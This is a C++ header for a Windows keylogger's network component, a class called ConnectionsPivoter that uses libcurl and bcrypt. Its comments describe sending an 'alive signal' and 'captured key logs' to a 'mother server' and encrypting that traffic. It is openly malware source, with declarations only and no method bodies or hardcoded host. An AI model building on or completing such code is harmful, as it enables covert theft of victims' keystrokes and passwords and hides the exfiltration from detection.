#ifndef CONNECTIONS_PIVOTER_H
#define CONNECTIONS_PIVOTER_H

#define CURL_STATICLIB

#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <bcrypt.h>
#include <curl/curl.h>

#pragma comment (lib, "Normaliz.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Wldap32.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "advapi32.lib")

class ConnectionsPivoter {
public:
	std::string url; 
	std::string allowed_country; 
	CURL* curl; 
	
	ConnectionsPivoter(std::string url); 
	ConnectionsPivoter();

	/// <summary>Send an alive signal to the mother server</summary>
	/// <returns>TRUE if successful</returns>
	BOOL send_alive_signal(); 

	/// <summary>Send the captured key logs to the mother server.</summary>
	/// <param name='codes:'>vector of key codes</param>
	/// <returns>TRUE if successful</returns>
	BOOL send_codes(std::vector<std::string> codes); 

	/// <summary>
	/// Encrypt the given data
	/// </summary>
	/// <param name='data:'>Data to encrypt</param>
	/// <returns>Encrypted data</returns>
	PBYTE encrypt_traffic(std::string data, size_t *output_length); 
private:

};

#endif 